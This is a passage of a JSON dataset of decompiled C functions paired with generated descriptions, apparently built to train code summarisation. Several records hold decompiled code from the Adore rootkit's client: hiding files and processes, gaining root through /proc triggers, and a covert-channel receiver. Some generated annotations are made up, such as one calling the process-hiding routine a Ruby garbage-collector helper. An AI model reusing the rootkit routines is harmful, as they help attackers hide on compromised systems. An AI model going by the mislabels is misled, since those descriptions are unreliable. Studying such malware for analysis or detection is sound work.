        "longer_label": "The code is a C function named `covert_recv` which takes in parameters representing network data and attempts to receive TCP packets, converting the hostname, opening a receiving socket, reading data into a structure named `recv_tcp_0`, and returning the IP identifier if it's not equal to 4, otherwise returning -1, potentially indicating a failure to open the receiving socket."
    },
    {
        "id": 455,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "command",
            "line",
            "arguments",
            "for",
            "specific",
            "options",
            ",",
            "initializes",
            "the",
            "adore",
            "library",
            ",",
            "performs",
            "various",
            "operations",
            "based",
            "on",
            "the",
            "input",
            "option",
            "specified",
            ",",
            "and",
            "provides",
            "relevant",
            "output",
            "messages",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "unsigned",
            "int",
            "v3",
            ";",
            "char",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "unsigned",
            "int",
            "*",
            "v7",
            ";",
            "if",
            "(",
            "argc",
            "<",
            "=",
            "2",
            "&",
            "&",
            "(",
            "argc",
            "!",
            "=",
            "2",
            "|",
            "|",
            "*",
            "argv",
            "[",
            "1",
            "]",
            "!",
            "=",
            "85",
            "&",
            "&",
            "*",
            "argv",
            "[",
            "1",
            "]",
            "!",
            "=",
            "73",
            ")",
            ")",
            "{",
            "printf",
            "(",
            "\"Usage: %s {h,u,r,R,i,v,U} [file or PID]\\n\"",
            "\"\\n\"",
            "\"       I print info (secret UID etc)\\n\"",
            "\"       h hide file\\n\"",
            "\"       u unhide file\\n\"",
            "\"       r execute as root\\n\"",
            "\"       R remove PID forever\\n\"",
            "\"       U uninstall adore\\n\"",
            "\"       i make PID invisible\\n\"",
            "\"       v make PID visible\\n\"",
            "\"\\n\"",
            ",",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "v5",
            "=",
            "*",
            "argv",
            "[",
            "1",
            "]",
            ";",
            "v7",
            "=",
            "adore_init",
            "(",
            ")",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "adore_makeroot",
            "(",
            ")",
            "<",
            "0",
            ")",
            "fwrite",
            "(",
            "\"Failed to run as root. Trying anyway ...\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x29uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "v6",
            "=",
            "adore_getvers",
            "(",
            "v7",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "<",
            "=",
            "0",
            "&",
            "&",
            "v5",
            "!",
            "=",
            "73",
            ")",
            "{",
            "puts",
            "(",
            "\"Adore NOT installed. Exiting.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v6",
            ">",
            "55",
            ")",
            "printf",
            "(",
            "\"Adore 1.%d installed. Good luck.\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v6",
            ")",
            ";",
            "else",
            "printf",
            "(",
            "\"Found adore 1.%d installed. Please update adore.\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v6",
            ")",
            ";",
            "v3",
            "=",
            "v5",
            "-",
            "73",
            ";",
            "if",
            "(",
            "v3",
            "<",
            "=",
            "0x2D",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "puts",
            "(",
            "\"Did nothing or failed.\"",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a C program that initializes and interacts with the \"adore\" rootkit, performing various operations such as hiding files, executing as root, and managing processes based on user input, with conditional checks and error handling."
    },
    {
        "id": 456,
        "docstring_tokens": [
            "The",
            "code",
            "is",
            "a",
            "function",
            "that",
            "creates",
            "and",
            "hides",
            "a",
            "file",
            "named",
            "``",
            "hide-",
            "{",
            "pid",
            "}",
            "''",
            "in",
            "a",
            "specified",
            "directory",
            "using",
            "the",
            "given",
            "PID",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "char",
            "s",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "a2",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"/proc/hide-%d\"",
            ",",
            "a2",
            ")",
            ";",
            "v3",
            "=",
            "open",
            "(",
            "s",
            ",",
            "66",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "close",
            "(",
            "v3",
            ")",
            ";",
            "unlink",
            "(",
            "s",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_hide` function is used to conceal Ruby objects from being directly accessible by Ruby code, typically employed for internal data structures or implementation details to prevent unintended manipulation or interference.",
            "The function __readfsqword is likely used to read a quadword (64 bits) from the FS segment register in assembly language, often utilized for low-level system programming tasks like accessing thread information or processor-specific registers on x86 architectures.",
            "The function named \"close\" is likely intended to handle file descriptor closure in a C program, based on the provided code snippets involving file I/O operations like opening, reading, and writing files, as well as directory iteration, memory mapping, and low-level system calls."
        ],
        "longer_label": "The provided code is a function named `adore_hideproc` which conceals Ruby objects from the garbage collector by creating and immediately removing a file in the `/proc` directory identified by a numerical parameter, likely intended for internal bookkeeping or compatibility purposes, utilizing low-level system calls like `open`, `close`, and `unlink`, with the `__readfsqword` function possibly being utilized for accessing system-specific data structures."
    },
    {
        "id": 457,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "creates",
            "and",
            "deletes",
            "a",
            "file",
            "for",
            "a",
            "specified",
            "process",
            "ID",
            "in",
            "a",
            "predefined",
            "directory",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "char",
            "s",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "a2",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"/proc/unhide-%d\"",
            ",",
            "a2",
            ")",
            ";",
            "v3",
            "=",
            "open",
            "(",
            "s",
            ",",
            "66",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "close",
            "(",
            "v3",
            ")",
            ";",
            "unlink",
            "(",
            "s",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_unhideproc` function is designed to make a previously hidden process visible again by sending a specific signal to it, likely as part of a process-hiding mechanism in a security or system administration context.",
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from the FS segment register on x86 architecture, providing access to thread-local storage (TLS) or other system-specific data stored in the FS segment, primarily used in low-level system programming or debugging contexts.",
            "The `close` function in this code likely deals with closing file descriptors and releasing resources associated with them, especially in the context of memory-mapped files and other system-level operations, as indicated by the inclusion of headers such as `a.h`, `m.h`, and `h.h`, and functions like `open()`, `fstat()`, `munmap()`, `mmap()`, `read()`, `write()`, and `exit()`."
        ],
        "longer_label": "The `adore_unhideproc` function likely serves to unhide a previously concealed process by accessing system-specific data, opening and closing a file associated with the process, and ultimately returning a success status."
    },
    {
        "id": 458,
        "docstring_tokens": [
            "The",
            "code",
            "loads",
            "a",
            "champion",
            "into",
            "a",
            "virtual",
            "machine",
            ",",
            "parses",
            "the",
            "champion",
            "header",
            ",",
            "copies",
            "the",
            "name",
            "and",
            "comment",
            ",",
            "assigns",
            "an",
            "ID",
            ",",
            "reads",
            "the",
            "champion",
            "'s",
            "program",
            "into",
            "memory",
            ",",
            "sets",
            "ownership",
            "in",
            "memory",
            ",",
            "initializes",
            "a",
            "process",
            ",",
            "logs",
            "information",
            "about",
            "the",
            "champion",
            ",",
            "and",
            "increments",
            "the",
            "index",
            "before",
            "closing",
            "the",
            "file",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "t_vm",
            "*",
            "vm",
            ",",
            "int",
            "fd",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "_DWORD",
            "*",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "char",
            "v6",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "ssize_t",
            "v9",
            ";",
            "size_t",
            "p_nplayers",
            ";",
            "unsigned",
            "int",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "char",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "const",
            "char",
            "*",
            "v16",
            ";",
            "const",
            "char",
            "*",
            "v17",
            ";",
            "unsigned",
            "int",
            "v18",
            ";",
            "size_t",
            "champ",
            ";",
            "t_byte",
            "*",
            "pc",
            ";",
            "char",
            "v23",
            "[",
            "2392",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v24",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v23",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "_asan_stack_malloc_6",
            "(",
            "2368L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"1 48 2192 6 hdr:97\"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "ch_load_champ",
            ";",
            "v4",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v4",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v4",
            "[",
            "536862721",
            "]",
            "=",
            "61937",
            ";",
            "v4",
            "[",
            "536862790",
            "]",
            "=",
            "-",
            "202116109",
            ";",
            "v4",
            "[",
            "536862791",
            "]",
            "=",
            "-",
            "202116109",
            ";",
            "v4",
            "[",
            "536862792",
            "]",
            "=",
            "-",
            "202116109",
            ";",
            "v4",
            "[",
            "536862793",
            "]",
            "=",
            "-",
            "202116109",
            ";",
            "v24",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "ch_parse_champ_header",
            "(",
            "(",
            "t_hdr",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "48",
            ")",
            ",",
            "fd",
            ")",
            ";",
            "champ",
            "=",
            "(",
            "size_t",
            ")",
            "&",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "champions",
            "[",
            "index_4100",
            "]",
            ";",
            "memcpy_",
            "(",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "champions",
            "[",
            "index_4100",
            "]",
            ".",
            "name",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "52",
            ")",
            ",",
            "0x80uL",
            "L",
            ")",
            ";",
            "v7",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "188",
            ")",
            ";",
            "memcpy_",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "champ",
            "+",
            "133",
            ")",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "188",
            ")",
            ",",
            "0x800uL",
            "L",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "index_4100",
            "-",
            "1",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "champ",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "LOBYTE",
            "(",
            "v7",
            ")",
            "=",
            "v6",
            "!",
            "=",
            "0",
            ";",
            "v8",
            "=",
            "(",
            "v6",
            "!",
            "=",
            "0",
            ")",
            "&",
            "(",
            "unsigned",
            "__int8",
            ")",
            "(",
            "(",
            "char",
            ")",
            "(",
            "(",
            "champ",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v8",
            ")",
            "_asan_report_store4",
            "(",
            "champ",
            ",",
            "v7",
            ",",
            "v8",
            ",",
            "v5",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "champ",
            "=",
            "v5",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "nplayers",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            ")",
            "_asan_report_load1",
            "(",
            "&",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "nplayers",
            ")",
            ";",
            "pc",
            "=",
            "&",
            "vm",
            "-",
            ">",
            "memory",
            "[",
            "4096",
            "/",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "nplayers",
            "*",
            "index_4100",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "_asan_report_load4",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "v9",
            "=",
            "read",
            "(",
            "fd",
            ",",
            "pc",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "_asan_report_load4",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "if",
            "(",
            "v9",
            "!",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ")",
            "perror_",
            "(",
            "\"read\"",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "_asan_report_load4",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "p_nplayers",
            "=",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "champ",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "champ",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "champ",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "p_nplayers",
            "=",
            "champ",
            ";",
            "_asan_report_load4",
            "(",
            "champ",
            ")",
            ";",
            "}",
            "v11",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "champ",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "nplayers",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            ")",
            "{",
            "p_nplayers",
            "=",
            "(",
            "size_t",
            ")",
            "&",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "nplayers",
            ";",
            "_asan_report_load1",
            "(",
            "&",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "nplayers",
            ")",
            ";",
            "}",
            "v12",
            "=",
            "v11",
            ";",
            "memset_",
            "(",
            "&",
            "vm",
            "-",
            ">",
            "owner",
            "[",
            "4096",
            "/",
            "vm",
            "-",
            ">",
            "corewar",
            ".",
            "nplayers",
            "*",
            "index_4100",
            "]",
            ",",
            "v11",
            ",",
            "p_nplayers",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "_asan_report_load4",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "v13",
            "=",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "v14",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "champ",
            "+",
            "2184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "LOBYTE",
            "(",
            "v12",
            ")",
            "=",
            "v14",
            "!",
            "=",
            "0",
            ";",
            "v15",
            "=",
            "(",
            "v14",
            "!",
            "=",
            "0",
            ")",
            "&",
            "(",
            "unsigned",
            "__int8",
            ")",
            "(",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "champ",
            "-",
            "120",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v14",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v15",
            ")",
            "_asan_report_store4",
            "(",
            "champ",
            "+",
            "2184",
            ",",
            "v12",
            ",",
            "v15",
            ",",
            "v13",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "champ",
            "+",
            "2184",
            ")",
            "=",
            "v13",
            ";",
            "p_init_process",
            "(",
            "vm",
            ",",
            "pc",
            ",",
            "champ",
            ")",
            ";",
            "v16",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "champ",
            "+",
            "133",
            ")",
            ";",
            "v17",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "champ",
            "+",
            "4",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "_asan_report_load4",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "v18",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "184",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "champ",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "champ",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "champ",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "_asan_report_load4",
            "(",
            "champ",
            ")",
            ";",
            "printf",
            "(",
            "\"* Player %d, weighing %d bytes, \\\"%s\\\" (\\\"%s\\\") !\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "champ",
            "+",
            "2",
            ")",
            ",",
            "v18",
            ",",
            "v17",
            ",",
            "v16",
            ")",
            ";",
            "+",
            "+",
            "index_4100",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "if",
            "(",
            "v23",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8118",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8120",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "_asan_stack_free_6",
            "(",
            "v2",
            ",",
            "2368L",
            "L",
            ",",
            "v23",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely serves to implement a stack data structure, as indicated by the presence of stack-related code snippets defining structures such as StackNode and Stack_tag, used for various purposes like managing execution environments, runtime stacks, and binary search trees.",
            "The function `malloc` appears to be a memory allocation function that allocates memory using `GlobalAlloc` with zero initialization in a Windows environment, typically used to dynamically allocate memory for variables or data structures."
        ],
        "longer_label": "The provided code appears to be a function (`ch_load_champ`) written in C, which loads a champion into a virtual machine (`vm`) for a corewar game, involving memory allocation, parsing champion headers, reading data from a file descriptor, initializing processes, and printing relevant information, potentially managing memory allocation through stack and heap operations."
    },
    {
        "id": 459,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "adore_makeroot",
            "`",
            "attempts",
            "to",
            "gain",
            "root",
            "privileges",
            "by",
            "creating",
            "and",
            "opening",
            "a",
            "file",
            ",",
            "then",
            "deleting",
            "it",
            ",",
            "and",
            "checking",
            "if",
            "the",
            "effective",
            "user",
            "ID",
            "is",
            "0",
            "before",
            "returning",
            "success",
            "or",
            "failure",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "v0",
            ";",
            "v0",
            "=",
            "open",
            "(",
            "\"/proc/fullprivs\"",
            ",",
            "66",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "close",
            "(",
            "v0",
            ")",
            ";",
            "unlink",
            "(",
            "\"/proc/fullprivs\"",
            ")",
            ";",
            "if",
            "(",
            "geteuid",
            "(",
            ")",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"close\" function appears to be part of a larger program or library, possibly related to system operations and file handling, as it includes code snippets for file I/O operations like opening, closing, and memory mapping files, along with directory iteration, and printf/scanf functionality."
        ],
        "longer_label": "The code attempts to open a file named \"/proc/fullprivs\", closes it, then deletes it, returning a specific value based on the effective user ID, with the annotation suggesting it's part of a larger system-related program or library."
    },
    {
        "id": 460,
        "docstring_tokens": [
            "This",
            "function",
            "calculates",
            "the",
            "length",
            "of",
            "the",
            "longest",
            "line",
            "in",
            "a",
            "given",
            "character",
            "buffer",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "v3",
            "=",
            "0",
            ";",
            "v4",
            "=",
            "0",
            ";",
            "while",
            "(",
            "a1",
            "+",
            "+",
            ")",
            "{",
            "+",
            "+",
            "v4",
            ";",
            "if",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "10",
            "&",
            "&",
            "v4",
            ">",
            "(",
            "int",
            ")",
            "v3",
            ")",
            "{",
            "v3",
            "=",
            "v4",
            ";",
            "v4",
            "=",
            "0",
            ";",
            "}",
            "}",
            "return",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code aims to find the length of the longest line (in characters) in a string represented by the `_BYTE` array `a1`, resetting the counter `v4` when encountering a newline character and updating the maximum length `v3` if a longer line is found."
    },
    {
        "id": 461,
        "docstring_tokens": [
            "This",
            "code",
            "takes",
            "a",
            "variable",
            "number",
            "of",
            "arguments",
            "and",
            "prints",
            "them",
            "in",
            "a",
            "frame",
            "with",
            "a",
            "maximum",
            "buffer",
            "size",
            ",",
            "checking",
            "if",
            "the",
            "output",
            "exceeds",
            "the",
            "buffer",
            "size",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "gcc_va_list",
            "arg",
            ";",
            "char",
            "s",
            "[",
            "192",
            "]",
            ";",
            "char",
            "v5",
            ";",
            "char",
            "v6",
            "[",
            "12480",
            "]",
            ";",
            "__int64",
            "v7",
            "[",
            "490",
            "]",
            ";",
            "while",
            "(",
            "v7",
            "!",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "&",
            "v5",
            ")",
            ";",
            "v7",
            "[",
            "489",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "vsnprintf",
            "(",
            "s",
            ",",
            "0x1000uL",
            "L",
            ",",
            "a1",
            ",",
            "arg",
            ")",
            ">",
            "4096",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v2",
            "=",
            "get_longest_line",
            "(",
            "s",
            ")",
            "+",
            "2",
            ";",
            "memset",
            "(",
            "v6",
            ",",
            "42",
            ",",
            "v2",
            ")",
            ";",
            "return",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `get_long` is intended to retrieve a 64-bit integer from a specified memory address or buffer, likely used for low-level memory manipulation or data extraction in C programming."
        ],
        "longer_label": "The provided code defines a function `print_in_frame` which accepts a variable number of arguments, formats them into a string, checks if the formatted string exceeds a certain length, and if not, calculates the length of the longest line in the string plus 2, fills a buffer with asterisks based on that length, and returns the calculated length."
    },
    {
        "id": 462,
        "docstring_tokens": [
            "The",
            "function",
            "logs",
            "different",
            "log",
            "levels",
            "with",
            "corresponding",
            "colors",
            "and",
            "formats",
            "the",
            "log",
            "message",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "gcc_va_list",
            "arg",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
